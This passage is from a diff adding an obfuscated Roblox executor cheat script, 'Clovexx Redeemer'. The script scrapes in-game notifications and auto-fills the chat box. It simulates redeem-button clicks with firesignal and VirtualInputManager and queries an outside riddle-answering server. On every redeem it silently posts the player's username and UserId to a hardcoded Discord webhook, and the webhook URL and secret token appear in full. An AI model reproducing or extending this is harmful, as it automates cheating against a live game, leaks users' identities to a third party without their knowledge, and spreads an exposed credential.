+		return t21, true
+	end
+	local function v265()
+		local v266, v267 = v259()
+
+		if not v267 then
+			return
+		end
+
+		for _, descendant in ipairs(workspace:GetDescendants()) do
+			if descendant:IsA("Animator") then
+				for _, v in ipairs(descendant:GetPlayingAnimationTracks()) do
+					local Animation = v.Animation
+
+					if Animation and v266[Animation.AnimationId] then
+						v:Stop(0)
+					end
+				end
+			end
+		end
+	end
+
+	v236(v235, "Disable All Animations", not t3.AnimationsEnabled, function(p68)
+		t3.AnimationsEnabled = not p68
+
+		if not t3.AnimationsEnabled then
+			if connection then
+				connection:Disconnect()
+			end
+
+			v265()
+
+			local n7 = 0
+
+			connection = RunService.Heartbeat:Connect(function(dt)
+				n7 += dt
+
+				if n7 < (v15 and 0.35 or 0.1) then
+					return
+				end
+
+				n7 = 0
+				v265()
+			end)
+			table.insert(genv.CloverRedeemerConnections, connection)
+		elseif connection then
+			connection:Disconnect()
+			connection = nil
+		end
+	end)
+
+	local TextButton13 = v26("TextButton", {
+		Size = UDim2.new(1, 0, 0, 34),
+		BackgroundColor3 = Color3.fromRGB(30, 52, 38),
+		Text = "↺ Reset UI position",
+		TextColor3 = t1.NEON,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		AutoButtonColor = false,
+		Parent = v235
+	})
+	local v275 = v31(TextButton13, t1.NEON, 1, 0.6)
+
+	v27(TextButton13, 8)
+	v39(TextButton13, Color3.fromRGB(30, 52, 38), v275)
+	TextButton13.MouseButton1Click:Connect(function()
+		v43()
+	end)
+	t19 = {}
+
+	local riddleAi, v277 = v42("Riddle AI", UDim2.fromOffset(280, 280), UDim2.new(0.5, 145, 0.5, -245))
+
+	v29(v277, 8)
+
+	local TextLabel10 = v26("TextLabel", {
+		Size = UDim2.new(1, 0, 0, 14),
+		BackgroundTransparency = 1,
+		Text = "AI server: checking…",
+		TextColor3 = t1.DIM2,
+		Font = Enum.Font.GothamBold,
+		TextSize = 10,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = v277
+	})
+	local TextBox = v26("TextBox", {
+		Size = UDim2.new(1, 0, 0, 56),
+		BackgroundColor3 = t1.INNER_DARK,
+		Text = "",
+		PlaceholderText = "Paste or auto-captured riddle text…",
+		TextColor3 = t1.TEXT,
+		PlaceholderColor3 = t1.DIM,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		TextWrapped = true,
+		ClearTextOnFocus = false,
+		MultiLine = true,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		TextYAlignment = Enum.TextYAlignment.Top,
+		Parent = v277
+	})
+
+	v27(TextBox, 8)
+	v31(TextBox, t1.GREEN, 1, 0.8)
+	v28(TextBox, 6, 6, 8, 8)
+
+	local Frame12 = v26("Frame", {
+		Size = UDim2.new(1, 0, 0, 32),
+		BackgroundTransparency = 1,
+		Parent = v277
+	})
+
+	v30(Frame12, 6)
+
+	local TextButton14 = v26("TextButton", {
+		Size = UDim2.new(0.5, -3, 1, 0),
+		BackgroundColor3 = t1.INNER,
+		Text = "🧩 Ask (manual)",
+		TextColor3 = t1.NEON,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		AutoButtonColor = false,
+		Parent = Frame12
+	})
+	local v282 = v31(TextButton14, t1.NEON, 1, 0.7)
+
+	v27(TextButton14, 8)
+	v39(TextButton14, t1.INNER, v282)
+
+	local TextButton15 = v26("TextButton", {
+		Size = UDim2.new(0.5, -3, 1, 0),
+		BackgroundColor3 = t1.NEON,
+		Text = "🎯 Next Msg = Riddle",
+		TextColor3 = t1.BG,
+		Font = Enum.Font.GothamBold,
+		TextSize = 11,
+		AutoButtonColor = false,
+		Parent = Frame12
+	})
+
+	v27(TextButton15, 8)
+	v39(TextButton15, t1.NEON, nil, t1.NEON:Lerp(t1.WHITE, 0.15))
+
+	local Frame13 = v26("Frame", {
+		Size = UDim2.new(1, 0, 0, 28),
+		BackgroundColor3 = t1.INNER,
+		Parent = v277
+	})
+
+	v27(Frame13, 8)
+	v31(Frame13, t1.WHITE, 1, 0.93)
+
+	local TextLabel11 = v26("TextLabel", {
+		Size = UDim2.new(1, -66, 1, 0),
+		Position = UDim2.fromOffset(10, 0),
+		BackgroundTransparency = 1,
+		Text = "Auto Redeem: OFF",
+		TextColor3 = t1.TEXT,
+		Font = Enum.Font.GothamBold,
+		TextSize = 10,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = Frame13
+	})
+	local TextButton16 = v26("TextButton", {
+		Size = UDim2.fromOffset(24, 22),
+		Position = UDim2.new(1, -58, 0.5, -11),
+		BackgroundColor3 = t1.INNER_DARK,
+		Text = "◀",
+		TextColor3 = t1.NEON,
+		Font = Enum.Font.GothamBold,
+		TextSize = 12,
+		AutoButtonColor = false,
+		Parent = Frame13
+	})
+
+	v27(TextButton16, 6)
+
+	local v287 = v31(TextButton16, t1.NEON, 1, 0.7)
+
+	v39(TextButton16, t1.INNER_DARK, v287)
+
+	local TextButton17 = v26("TextButton", {
+		Size = UDim2.fromOffset(24, 22),
+		Position = UDim2.new(1, -30, 0.5, -11),
+		BackgroundColor3 = t1.INNER_DARK,
+		Text = "▶",
+		TextColor3 = t1.NEON,
+		Font = Enum.Font.GothamBold,
+		TextSize = 12,
+		AutoButtonColor = false,
+		Parent = Frame13
+	})
+
+	v27(TextButton17, 6)
+
+	local v289 = v31(TextButton17, t1.NEON, 1, 0.7)
+
+	v39(TextButton17, t1.INNER_DARK, v289)
+
+	local Frame14 = v26("Frame", {
+		Size = UDim2.new(1, 0, 1, -160),
+		BackgroundColor3 = t1.INNER,
+		Parent = v277
+	})
+
+	v27(Frame14, 8)
+	v31(Frame14, t1.GOLD, 1, 0.75)
+	v28(Frame14, 8, 8, 10, 10)
+
+	local TextLabel12 = v26("TextLabel", {
+		Size = UDim2.fromScale(1, 1),
+		BackgroundTransparency = 1,
+		Text = "(no answer yet)",
+		TextColor3 = t1.GOLD,
+		Font = Enum.Font.GothamBold,
+		TextSize = 22,
+		TextWrapped = true,
+		TextXAlignment = Enum.TextXAlignment.Center,
+		TextYAlignment = Enum.TextYAlignment.Center,
+		Parent = Frame14
+	})
+
+	t19.Panel = riddleAi
+	t19.Status = TextLabel10
+	t19.Box = TextBox
+	t19.AskBtn = TextButton14
+	t19.ArmBtn = TextButton15
+	t19.StepLabel = TextLabel11
+	t19.StepLeftBtn = TextButton16
+	t19.StepRightBtn = TextButton17
+	t19.AnswerTxt = TextLabel12
+	t20 = {
+		Status,
+		livePreview,
+		Texts,
+		Actions,
+		Words,
+		Options,
+		t19.Panel
+	}
+end
+
+local function v292()
+end
+
+local t22, s2, u295, v296, v297, v298, v299
+
+do
+	local v300
+
+	t22 = {}
+	s2 = ""
+	u295 = false
+
+	local t23 = {}
+	local t24 = {}
+	local n8 = 1
+	local s3 = ""
+	local t25 = {}
+	local t26 = {}
+	local t27 = {}
+	local t28 = {}
+	local t29 = {}
+
+	local function v310(p69)
+		if p69 then
+			return p69.Obj ~= nil and t26[p69.Obj] == true
+		end
+
+		return true
+	end
+	local function v311(p70)
+		local v312 = #t24
+
+		if v312 == 0 then
+			return nil
+		end
+
+		for i = 0, v312 - 1 do
+			local v314 = (p70 - 1 + i) % v312 + 1
+
+			if not v310(t24[v314]) then
+				return v314
+			end
+		end
+
+		return nil
+	end
+	local function v315(p71)
+		if not p71 or typeof(p71) ~= "Instance" then
+			return nil
+		end
+
+		if not p71:IsA("TextLabel") and not p71:IsA("TextButton") and not p71:IsA("TextBox") then
+			return nil
+		end
+
+		local ok, result = pcall(function()
+			return p71.Text
+		end)
+
+		if not ok or result == nil then
+			return nil
+		end
+
+		return tostring(result)
+	end
+	local function v318(p72)
+		while true do
+			if not p72 then
+				return true
+			end
+
+			if p72 == PlayerGui then
+				return true
+			end
+
+			local ok, result = pcall(function()
+				return p72.Visible
+			end)
+
+			if not ok or result ~= false then
+				p72 = p72.Parent
+
+				continue
+			end
+
+			break
+		end
+
+		return false
+	end
+	local function v321()
+		if not u1 or typeof(u1) ~= "Instance" then
+			return {}
+		end
+
+		local v322 = v4(function()
+			return game.Players.LocalPlayer.PlayerGui.TopNotification.TopNotification
+		end) or u1
+		local t30 = {}
+		local t31 = {}
+
+		local function v325(p73)
+			local v326 = v315(p73)
+
+			if v326 == nil or v326 == "" then
+				return
+			end
+
+			if not v318(p73) or t31[p73] then
+				return
+			end
+
+			t31[p73] = true
+
+			local vector2 = Vector2.new(0, 0)
+
+			pcall(function()
+				vector2 = p73.AbsolutePosition
+			end)
+			table.insert(t30, {
+				Text = v326,
+				Obj = p73,
+				X = vector2.X,
+				Y = vector2.Y
+			})
+		end
+
+		v325(u1)
+
+		for _, descendant in ipairs(u1:GetDescendants()) do
+			v325(descendant)
+		end
+
+		if v322 ~= u1 then
+			for _, descendant in ipairs(v322:GetDescendants()) do
+				v325(descendant)
+			end
+		end
+
+		table.sort(t30, function(p74, p75)
+			if math.abs(p74.Y - p75.Y) > 4 then
+				return p74.Y < p75.Y
+			end
+
+			return p74.X < p75.X
+		end)
+
+		return t30
+	end
+	local function v332(p76)
+		local t32 = {}
+
+		for i, v in ipairs(p76) do
+			t32[i] = v.Text
+		end
+
+		return table.concat(t32, "\n---\n")
+	end
+
+	v296 = function()
+		for _, v in ipairs(t25) do
+			v:Destroy()
+		end
+
+		table.clear(t25)
+
+		local v338 = #t24
+
+		if v338 < n8 then
+			n8 = math.max(v338, 1)
+		end
+
+		TextLabel6.Text = v338 .. (v338 == 1 and " notification" or " notifications")
+		TextLabel7.Text = v338 > 0 and "Selected: Notification " .. n8 .. " / " .. v338 or "Waiting for notifications..."
+
+		for i, v in ipairs(t24) do
+			local v341 = i == n8
+			local v342 = v310(v)
+			local GREEN = v341 and t1.GREEN or v342 and Color3.fromRGB(20, 26, 22) or t1.INNER
+			local BG = v341 and t1.BG or v342 and t1.DIM2 or t1.TEXT
+			local v345 = v342 and "✓ " or ""
+			local TextButton12 = v26("TextButton", {
+				Size = UDim2.fromOffset(120, 24),
+				BackgroundColor3 = GREEN,
+				Text = v345 .. "Notification " .. i,
+				TextColor3 = BG,
+				Font = Enum.Font.GothamBold,
+				TextSize = 10,
+				AutoButtonColor = false,
+				Parent = ScrollingFrame2
+			})
+
+			v27(TextButton12, 6)
+			v31(TextButton12, v341 and t1.WHITE or t1.GREEN, 1, v341 and 0.55 or 0.85)
+			TextButton12.MouseButton1Click:Connect(function()
+				n8 = i
+				v300(v.Text)
+				v296()
+			end)
+			table.insert(t25, TextButton12)
+		end
+
+		ScrollingFrame2.CanvasSize = UDim2.fromOffset(v203.AbsoluteContentSize.X + 8, 0)
+	end
+
+	local function v347()
+		local t33 = {}
+
+		for match in s2:gmatch("%S+") do
+			if t22[match] ~= false then
+				table.insert(t33, match)
+			end
+		end
+
+		return table.concat(t33, " ")
+	end
+	local function v350()
+		local v351 = v347()
+
+		TextLabel4.Text = v351 ~= "" and v351 or "—"
+
+		local n9 = 0
+
+		for _ in v351:gmatch("%S+") do
+			n9 += 1
+		end
+
+		TextLabel3.Text = n9 .. " words"
+	end
+	local function v354(p77, p78)
+		local Frame12 = v26("Frame", {
+			Size = UDim2.fromOffset(28, 14),
+			Position = UDim2.new(1, -30, 0.5, -7),
+			BackgroundColor3 = p78 and t1.GREEN or Color3.fromRGB(60, 60, 60),
+			BorderSizePixel = 0,
+			Parent = p77
+		})
+
+		v27(Frame12, 7)
+
+		local Frame13 = v26("Frame", {
+			Size = UDim2.fromOffset(10, 10),
+			Position = UDim2.new(0, p78 and 16 or 2, 0.5, -5),
+			BackgroundColor3 = t1.WHITE,
+			BorderSizePixel = 0,
+			Parent = Frame12
+		})
+
+		v27(Frame13, 5)
+
+		return Frame12, Frame13
+	end
+
+	v297 = function()
+		for _, v in ipairs(t23) do
+			v:Destroy()
+		end
+
+		table.clear(t23)
+
+		local t34 = {}
+		local n10 = 0
+
+		for match in s2:gmatch("%S+") do
+			if not t34[match] then
+				t34[match] = true
+				n10 += 1
+
+				if t22[match] == nil then
+					t22[match] = true
+				end
+
+				local v362 = t22[match]
+				local TextButton12 = v26("TextButton", {
+					LayoutOrder = n10,
+					Size = UDim2.new(1, -4, 0, 32),
+					BackgroundColor3 = t1.INNER,
+					BackgroundTransparency = 0.3,
+					Text = "",
+					AutoButtonColor = false,
+					BorderSizePixel = 0,
+					Parent = ScrollingFrame3
+				})
+
+				v27(TextButton12, 8)
+
+				local v364 = v31(TextButton12, v362 and t1.GREEN or t1.WHITE, 1, v362 and 0.7 or 0.95)
+
+				table.insert(t23, TextButton12)
+
+				local v365 = v26
+				local s4 = "TextLabel"
+
+				v365(s4, {
+					Size = UDim2.new(1, -40, 1, 0),
+					Position = UDim2.fromOffset(10, 0),
+					BackgroundTransparency = 1,
+					Text = match,
+					TextColor3 = v362 and t1.TEXT or t1.DIM,
+					Font = Enum.Font.GothamBold,
+					TextSize = 12,
+					TextXAlignment = Enum.TextXAlignment.Left,
+					Parent = TextButton12
+				})
+
+				local v367, v368 = v354(TextButton12, v362)
+
+				v39(TextButton12, t1.INNER, v364)
+				TextButton12.MouseButton1Click:Connect(function()
+					t22[match] = not t22[match]
+
+					local v369 = t22[match]
+
+					if t3.AnimationsEnabled then
+						TweenService:Create(v367, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
+							BackgroundColor3 = v369 and t1.GREEN or Color3.fromRGB(60, 60, 60)
+						}):Play()
+						TweenService:Create(v368, TweenInfo.new(0.15, Enum.EasingStyle.Back), {
+							Position = UDim2.new(0, v369 and 16 or 2, 0.5, -5)
+						}):Play()
+						task.delay(0.15, v297)
+					else
+						local GREEN = v369 and t1.GREEN
+
+						v367.BackgroundColor3 = GREEN or Color3.fromRGB(60, 60, 60)
+						v368.Position = UDim2.new(0, v369 and 16 or 2, 0.5, -5)
+						v297()
+					end
+				end)
+			end
+		end
+
+		v350()
+	end
+	v298 = function()
+		if not u2 or typeof(u2) ~= "Instance" then
+			v292("box: missing targets", t1.RED)
+
+			return
+		end
+
+		local v371 = v347()
+
+		if v371 == "" then
+			return
+		end
+
+		pcall(function()
+			local Text = u2.Text or ""
+
+			u2.Text = Text ~= "" and Text .. " " .. v371 or v371
+		end)
+
+		local v373 = t24[n8]
+
+		if v373 and v373.Obj then
+			t26[v373.Obj] = true
+		end
+
+		v292("sent → " .. v371, t1.NEON)
+		v296()
+		t18.NotifyWordsSent(v371)
+	end
+	v300 = function(p79)
+		local v374 = p79 or ""
+
+		if v374 == s2 then
+			return
+		end
+
+		table.clear(t22)
+		s2 = v374
+		TextLabel2.Text = v374 ~= "" and v374 or "(empty)"
+		v297()
+	end
+
+	local function v375(p80)
+		if not u2 or typeof(u2) ~= "Instance" then
+			v292("box: missing targets", t1.RED)
+
+			return
+		end
+
+		if not p80 or p80 == "" then
+			return
+		end
+
+		pcall(function()
+			local Text = u2.Text or ""
+
+			u2.Text = Text ~= "" and Text .. " " .. p80 or p80
+		end)
+		t26[p80] = true
+		v292("history sent", t1.NEON)
+		v296()
+		t18.NotifyWordsSent(p80)
+	end
+	local function v377()
+		for _, v in ipairs(t29) do
+			v:Destroy()
+		end
+
+		table.clear(t29)
+		TextLabel5.Text = #t27 .. (#t27 == 1 and " sentence" or " sentences")
+
+		for i = #t27, 1, -1 do
+			local v381 = t27[i]
+			local Frame12 = v26("Frame", {
+				Size = UDim2.new(1, -4, 0, 44),
+				BackgroundColor3 = t1.INNER,
+				Parent = ScrollingFrame,
+				LayoutOrder = #t27 - i + 1
+			})
+
+			v27(Frame12, 8)
+			v31(Frame12, t1.GREEN, 1, 0.85)
+			v28(Frame12, 6, 6, 8, 8)
+			v26("TextLabel", {
+				Size = UDim2.new(1, -56, 1, 0),
+				BackgroundTransparency = 1,
+				Text = v381,
+				TextColor3 = t1.TEXT,
+				Font = Enum.Font.GothamBold,
+				TextSize = 11,
+				TextWrapped = true,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextYAlignment = Enum.TextYAlignment.Top,
+				Parent = Frame12
+			})
+
+			local TextButton12 = v26("TextButton", {
+				Size = UDim2.fromOffset(48, 28),
+				Position = UDim2.new(1, -48, 0.5, -14),
+				BackgroundColor3 = t1.NEON,
+				Text = "Send",
+				TextColor3 = t1.BG,
+				Font = Enum.Font.GothamBold,
+				TextSize = 11,
+				AutoButtonColor = false,
+				Parent = Frame12
+			})
+
+			v27(TextButton12, 6)
+			v39(TextButton12, t1.NEON, nil, t1.NEON:Lerp(t1.WHITE, 0.15))
+			TextButton12.MouseButton1Click:Connect(function()
+				v375(v381)
+			end)
+			table.insert(t29, Frame12)
+		end
+	end
+	local function v384(p81)
+		local v385 = false
+
+		for _, v in ipairs(p81) do
+			if not t28[v.Text] then
+				t28[v.Text] = true
+				table.insert(t27, v.Text)
+				v385 = true
+			end
+		end
+
+		if v385 then
+			v377()
+		end
+	end
+
+	v299 = function()
+		local v388 = v321()
+		local v389 = v332(v388)
+
+		if v389 ~= s3 then
+			t24 = v388
+			s3 = v389
+			v384(v388)
+			v296()
+			t19.MaybeAutoCapture(v388)
+		end
+
+		if u295 then
+			local v390 = v311(n8)
+
+			if v390 and v390 ~= n8 then
+				n8 = v390
+				v296()
+			end
+
+			local v391 = t24[n8]
+
+			if t19.Armed then
+				v300(v391 and v391.Text or "")
+			elseif not v391 or v310(v391) then
+				v300(v391 and v391.Text or "")
+			else
+				v300(v391.Text)
+				v298()
+			end
+		else
+			local v392 = t24[n8]
+
+			v300(v392 and v392.Text or "")
+		end
+	end
+
+	local t35 = {}
+	local t36
+
+	local function v395()
+		if t36 then
+			return t36
+		end
+
+		t36 = {}
+
+		local v396 = v4(function()
+			return ReplicatedStorage.Datas.Animals
+		end)
+		local v397 = v4(function()
+			return require(v396)
+		end)
+
+		if type(v397) == "table" then
+			for k, v in pairs(v397) do
+				if type(k) == "string" then
+					table.insert(t36, k)
+				end
+
+				if type(v) == "table" and type(v.DisplayName) == "string" then
+					table.insert(t36, v.DisplayName)
+				end
+			end
+
+			table.sort(t36, function(p82, p83)
+				return #p82 > #p83
+			end)
+		end
+
+		return t36
+	end
+	local function v400(p84)
+		return (tostring(p84 or ""):gsub("<br%s*/>", "\n"):gsub("<[^>]->", ""):gsub("^%s+", ""):gsub("%s+$", ""))
+	end
+	local function v401(p85)
+		if not p85 or not p85:IsA("TextLabel") then
+			return false
+		end
+
+		local v402 = tostring(p85.Text or "")
+		local v403 = v402:lower()
+
+		print("[Clovexx] Checking Template text:", v402)
+
+		if v403:find("#92ff67", 1, true) then
+			print("[Clovexx] Match: rich text #92FF67")
+
+			return true
+		end
+
+		local TextColor3 = p85.TextColor3
+		local v405 = math.abs(TextColor3.R - color3.R) < 0.03 and math.abs(TextColor3.G - color3.G) < 0.03 and math.abs(TextColor3.B - color3.B) < 0.03
+
+		print("[Clovexx] Color fallback match:", v405)
+
+		return v405
+	end
+	local function v406(p86)
+		local v407 = v400(p86)
+		local v408 = v407:lower()
+
+		for _, v in ipairs(v395()) do
+			if v408:find(v:lower(), 1, true) then
+				return v
+			end
+		end
+
+		local v411 = v407:gsub("%s*spawned!?%s*$", ""):gsub("%s*redeemed!?%s*$", "")
+
+		return v411 ~= "" and v411 or v400(p86)
+	end
+	local function v412(p87, p88)
+		local v413 = p88 or p87
+		local v414 = tostring(v413 or "")
+
+		if v414 == "" or t35[v414] then
+			return
+		end
+
+		t35[v414] = true
+		print("[Clovexx] Sending webhook. Prize:", tostring(p87 or "Unknown"), "Raw:", tostring(p88 or ""))
+
+		local v415 = tostring(p87 or "Unknown")
+		local t37 = {
+			content = "@everyone **Code Redeemed!**",
+			allowed_mentions = {
+				parse = { "everyone" }
+			}
+		}
+		local embeds = {
+			{
+				title = "✅ Code Redeemed!",
+				description = "**A code was successfully redeemed in-game.**",
+				color = 9633639,
+				thumbnail = {
+					url = "https://cdn.discordapp.com/attachments/1517623581062729768/1521580678662324468/ChatGPT_Image_30_._2026_._19_31_11.png?ex=6a49f72f&is=6a48a5af&hm=6b4768ccb52fab5b8f59d538be058ac3e5e62b890a16adc9c0456bcd3ab5e694&"
+				},
+				fields = {
+					{
+						name = "Prize",
+						value = "**" .. v415 .. "**",
+						inline = false
+					},
+					{
+						name = "Roblox User",
+						value = "**@" .. LocalPlayer.Name .. "** (`" .. tostring(LocalPlayer.UserId) .. "`)",
+						inline = false
+					}
+				},
+				footer = {
+					text = "Clovexx Redeemer"
+				},
+				timestamp = DateTime.now():ToIsoDate()
+			}
+		}
+
+		t37.embeds = embeds
+		task.spawn(function()
+			local json = HttpService:JSONEncode(t37)
+			local request_ = syn and syn.request or http and http.request or http_request or request
+			local v420 = false
+
+			if request_ then
+				local ok, result = pcall(function()
+					return request_({
+						Url = "https://discord.com/api/webhooks/1522965859130409061/4nxPHluapIT4n9JvVqBdfRzzmjZSWd9AMg8sGgHG8442aghXj9uT6KxsNPJ9Euw6lr2X",
+						Method = "POST",
+						Headers = {
+							["Content-Type"] = "application/json"
+						},
+						Body = json
+					})
+				end)
+
+				v420 = ok and (not result or not result.StatusCode or result.StatusCode >= 200 and result.StatusCode < 300)
+			elseif HttpService.PostAsync then
+				v420 = pcall(function()
+					HttpService:PostAsync("https://discord.com/api/webhooks/1522965859130409061/4nxPHluapIT4n9JvVqBdfRzzmjZSWd9AMg8sGgHG8442aghXj9uT6KxsNPJ9Euw6lr2X", json, Enum.HttpContentType.ApplicationJson)
+				end)
+			end
+
+			print("[Clovexx] Discord webhook " .. (v420 and "sent" or "failed") .. " | Prize: " .. tostring(p87 or "Unknown"))
+		end)
+	end
+	local function v423(p89)
+		if p89:IsA("TextLabel") and p89.Name == "Template" and v401(p89) then
+			local v424 = tostring(p89.Text or "")
+
+			if v424 ~= "" then
+				warn("[Clovexx] Redeem Template found: " .. v400(v424))
+				v412(v406(v424), v424)
+
+				return true
+			end
+		end
+
+		return false
+	end
+	local function v425()
+		local v426 = v4(function()
+			return PlayerGui.Notification.Notification
+		end)
+
+		if not v426 then
+			print("[Clovexx] PlayerGui.Notification.Notification not found")
+
+			return
+		end
+
+		print("[Clovexx] Scanning PlayerGui.Notification.Notification for Template TextLabels")
+
+		local v427 = false
+
+		for _, descendant in ipairs(v426:GetDescendants()) do
+			v427 = v423(descendant) or v427
+		end
+
+		if not v427 then
+			print("[Clovexx] No matching Template TextLabel found under PlayerGui.Notification.Notification")
+		end
+	end
+	local function v430()
+		v425()
+
+		for _, v in ipairs({
+			0.15,
+			0.45,
+			0.9,
+			1.5,
+			2.5,
+			3.5,
+			5
+		}) do
+			task.delay(v, v425)
+		end
+	end
+
+	local u433
+	local t38 = {}
+
+	local function v435()
+		v8()
+
+		if u433 == u3 then
+			return
+		end
+
+		for _, v in ipairs(t38) do
+			pcall(function()
+				v:Disconnect()
+			end)
+		end
+
+		table.clear(t38)
+		u433 = u3
+
+		if not u433 or typeof(u433) ~= "Instance" or not u433:IsA("GuiButton") then
+			return
+		end
+
+		local function v438()
+			print("[Clovexx] Manual redeem button click detected")
+			v430()
+		end
+
+		table.insert(t38, u433.Activated:Connect(v438))
+		table.insert(t38, u433.MouseButton1Click:Connect(v438))
+
+		for _, v in ipairs(t38) do
+			table.insert(genv.CloverRedeemerConnections, v)
+		end
+	end
+
+	local u441 = false
+
+	local function v442()
+		if u441 then
+			return
+		end
+
+		u441 = true
+		task.delay(0.35, function()
+			u441 = false
+		end)
+		v8()
+
+		if not u3 or typeof(u3) ~= "Instance" then
+			v292("redeem: error alignment", t1.RED)
+
+			return
+		end
+
+		local v443 = u3
+		local u444 = false
+
+		pcall(function()
+			if v443:IsA("GuiButton") then
+				v443:Activate()
+				u444 = true
+			end
+		end)
+
+		if firesignal then
+			pcall(function()
+				if v443.MouseButton1Click then
+					firesignal(v443.MouseButton1Click)
+					u444 = true
+				end
+
+				if v443.Activated then
+					firesignal(v443.Activated)
+					u444 = true
+				end
+			end)
+		end
+
+		if not u444 then
+			pcall(function()
+				local VirtualInputManager = game:GetService("VirtualInputManager")
+				local AbsolutePosition = v443.AbsolutePosition
+				local AbsoluteSize = v443.AbsoluteSize
+				local v448 = AbsolutePosition.X + AbsoluteSize.X / 2
+				local v449 = AbsolutePosition.Y + AbsoluteSize.Y / 2
+
+				VirtualInputManager:SendMouseButtonEvent(v448, v449, 0, true, game, 1)
+				task.wait(0.05)
+				VirtualInputManager:SendMouseButtonEvent(v448, v449, 0, false, game, 1)
+				u444 = true
+			end)
+		end
+
+		v292(u444 and "redeemed ★" or "redeem failed", u444 and t1.GOLD or t1.RED)
+
+		if u444 then
+			v430()
+		end
+	end
+
+	local autoRedeemerThreshold = 0
+	local n11 = 0
+
+	local function v452()
+		if autoRedeemerThreshold == 0 then
+			t18.Label.Text = "Auto Redeemer: OFF (" .. n11 .. " sent)"
+		else
+			t18.Label.Text = "Auto Redeemer: " .. n11 .. "/" .. autoRedeemerThreshold
+		end
+	end
+
+	t18.NotifyWordsSent = function(p90)
+		local n12 = 0
+		local v454 = p90 or ""
+
+		for _ in tostring(v454):gmatch("%S+") do
+			n12 += 1
+		end
+
+		if n12 <= 0 then
+			return
+		end
+
+		n11 += n12
+		v452()
+
+		if autoRedeemerThreshold > 0 and autoRedeemerThreshold <= n11 then
+			v292("auto redeemer: " .. n11 .. "/" .. autoRedeemerThreshold .. " words reached", t1.GOLD)
+			v442()
+			n11 = 0
+			v452()
+		end
+	end
+	t18.ResetCount = function()
+		n11 = 0
+		v452()
+	end
+	t18.LeftBtn.MouseButton1Click:Connect(function()
+		autoRedeemerThreshold = math.max(0, autoRedeemerThreshold - 1)
+		v452()
+		v292("auto redeemer threshold: " .. autoRedeemerThreshold, t1.DIM)
+	end)
+	t18.RightBtn.MouseButton1Click:Connect(function()
+		autoRedeemerThreshold = math.min(20, autoRedeemerThreshold + 1)
+		v452()
+		v292("auto redeemer threshold: " .. autoRedeemerThreshold, t1.DIM)
+	end)
+	v452()
+
+	local function v456(p91, p92, p93)
+		local request_ = syn and syn.request or http and http.request or http_request or request
+
+		if not request_ then
+			return false, "no http function available on this executor"
+		end
+
+		local t39 = {
+			Url = p92,
+			Method = p91,
+			Headers = {
+				["Content-Type"] = "application/json",
+				["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+			}
+		}
+
+		if p93 then
+			t39.Body = HttpService:JSONEncode(p93)
+		end
+
+		local ok, result = pcall(function()
+			return request_(t39)
+		end)
+
+		if not ok then
+			return false, tostring(result)
+		end
+
+		if not result or not result.Body or result.Body == "" then
+			return false, "empty response from " .. p92
+		end
+
+		local ok2, result2 = pcall(function()
+			return HttpService:JSONDecode(result.Body)
+		end)
+
+		if ok2 then
+			return true, result2
+		end
+
+		return false, "bad json from " .. p92 .. " (raw: " .. tostring(result.Body):sub(1, 150) .. ")"
+	end
+
+	local u463 = false
+	local u464 = false
+	local t40 = {}
+	local autoRedeemThreshold = 0
+
+	local function v467()
+		if not u2 or typeof(u2) ~= "Instance" then
+			return 0
+		end
+
+		local ok, result = pcall(function()
+			return u2.Text or ""
+		end)
+
+		if ok then
+			local n13 = 0
+
+			for _ in tostring(result):gmatch("%S+") do
+				n13 += 1
+			end
+
+			return n13
+		end
+
+		return 0
+	end
+	local function v472()
+		local StepLabel = t19.StepLabel
+		local text = autoRedeemThreshold == 0 and "Auto Redeem: OFF"
+
+		if not text then
+			local v475 = autoRedeemThreshold
+			local v476 = autoRedeemThreshold == 1
+
+			text = "Auto Redeem after " .. v475 .. (v476 and " word" or " words")
+		end
+
+		StepLabel.Text = text
+	end
+	local function v477()
+		if autoRedeemThreshold <= 0 then
+			return
+		end
+
+		if autoRedeemThreshold <= v467() then
+			v292("auto redeem threshold reached (" .. autoRedeemThreshold .. " words)", t1.GOLD)
+			v442()
+		end
+	end
+	local function v478(p94)
+		if not u2 or typeof(u2) ~= "Instance" then
+			v292("box: missing targets", t1.RED)
+
+			return
+		end
+
+		pcall(function()
+			local Text = u2.Text or ""
+
+			u2.Text = Text ~= "" and Text .. " " .. p94 or p94
+		end)
+		v296()
+		t18.NotifyWordsSent(p94)
+	end
+	local function ask(p95)
+		if u463 then
+			return
+		end
+
+		local v481 = tostring(p95 or ""):gsub("^%s+", ""):gsub("%s+$", "")
+
+		if v481 == "" then
+			t19.AnswerTxt.Text = "(nothing to ask)"
+			t19.AnswerTxt.TextColor3 = t1.DIM
+
+			return
+		end
+
+		u463 = true
+		t19.AnswerTxt.Text = "thinking…"
+		t19.AnswerTxt.TextColor3 = t1.DIM
+		task.spawn(function()
+			local post, v483 = v456("POST", "https://sab-riddle-server.onrender.com/riddle", {
+				text = v481
+			})
+
+			u463 = false
+
+			if post and type(v483) == "table" and v483.answer and v483.answer ~= "" then
+				local text = tostring(v483.answer)
+
+				t19.AnswerTxt.Text = text
+				t19.AnswerTxt.TextColor3 = t1.GOLD
+				v478(text)
+				v292("riddle answered → sent to box: " .. text, t1.NEON)
+				v477()
+			else
+				local error = type(v483) == "table" and v483.error or tostring(v483)
+
+				t19.AnswerTxt.Text = "AI server error: " .. tostring(error)
+				t19.AnswerTxt.TextColor3 = t1.RED
+				v292("riddle AI failed: " .. tostring(error), t1.RED)
+			end
+		end)
+	end
+	local function v486(p96)
+		u464 = p96
+		t19.Armed = p96
+
+		if u464 then
+			table.clear(t40)
+
+			for _, v in ipairs(t24) do
+				t40[v.Text] = true
+			end
+
+			t19.ArmBtn.Text = "🎯 Waiting for next msg…"
+			t19.ArmBtn.BackgroundColor3 = t1.GOLD
+			t19.ArmBtn.TextColor3 = t1.BG
+		else
+			t19.ArmBtn.Text = "🎯 Next Msg = Riddle"
+			t19.ArmBtn.BackgroundColor3 = t1.NEON
+			t19.ArmBtn.TextColor3 = t1.BG
+		end
+	end
+	local function toggleArmed()
